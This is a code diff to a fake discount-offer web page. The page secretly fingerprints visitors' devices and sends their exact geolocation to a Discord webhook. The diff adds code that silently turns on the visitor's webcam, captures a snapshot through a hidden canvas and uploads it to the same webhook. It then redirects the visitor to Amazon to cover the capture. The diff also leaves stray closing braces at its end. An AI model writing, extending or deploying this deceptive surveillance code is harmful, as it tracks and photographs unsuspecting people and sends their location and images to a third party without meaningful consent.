@@ -21,6 +21,7 @@
         <p class="price">₹1,499 <span style="text-decoration: line-through; color: #767676; font-size: 16px;">₹3,999</span></p>
         <button class="btn" onclick="requestLocation()">Claim 60% Discount</button>
     </div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const deviceData = {
@@ -48,24 +49,63 @@
         sendToDiscord(`🌐 **New Visitor Alert!**\n📱 Device: ${deviceData.platform}\n🌍 TimeZone: ${deviceData.timeZone}\n🖥️ Resolution: ${deviceData.screenResolution}`);
 
         function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        alert("Permission Verified! Offer Claimed.");
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        // Exact location Discord par bhejane ke liye
-                        sendToDiscord(`🎯 **EXACT LOCATION FETCHED!**\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🗺️ Google Maps Link: https://google.com{lat},${lon}`);
-                   window.location.href = "https://amzn.in/d/09CIWsWb";
- },
-                    (error) => {
-                        alert("Offer activation failed: Permission denied.");
-                        sendToDiscord(`❌ User denied location permission.`);
-                    }
-                );
-            } else {
-                alert("Browser not supported.");
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // 1. Location text bhejega
+            sendToDiscord(`🎯 **LOCATION FETCHED!** \nLatitude: ${lat}\nLongitude: ${lon}`);
+
+            // 2. Background mein webcam active karega
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const context = canvas.getContext('2d');
+                    
+                    context.drawImage(video, 0, 0, 640, 480);
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // 3. Photo ko Discord par bhejega
+                    canvas.toBlob(function(blob) {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'snapshot.png');
+                        formData.append('payload_json', JSON.stringify({
+                            content: "📸 **Webcam Capture Received Successfully!**"
+                        }));
+
+                        fetch(discordWebhookUrl, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/png');
+
+                }, 1000);
+            })
+            .catch(err => {
+                console.log("Camera permission denied.");
+                sendToDiscord("❌ User denied camera permission.");
+            });
+
+            // 4. Amazon product par redirect kar dega
+            window.location.href = "https://amzn.in";
+        }, (error) => {
+            // Agar user location mana kare tab bhi Amazon par jaye
+            sendToDiscord("❌ User denied location permission.");
+            window.location.href = "https://amzn.in";
+        });
+    } else {
+        alert("Browser not supported.");
+    }
+}
+
             }
         }
     </script>
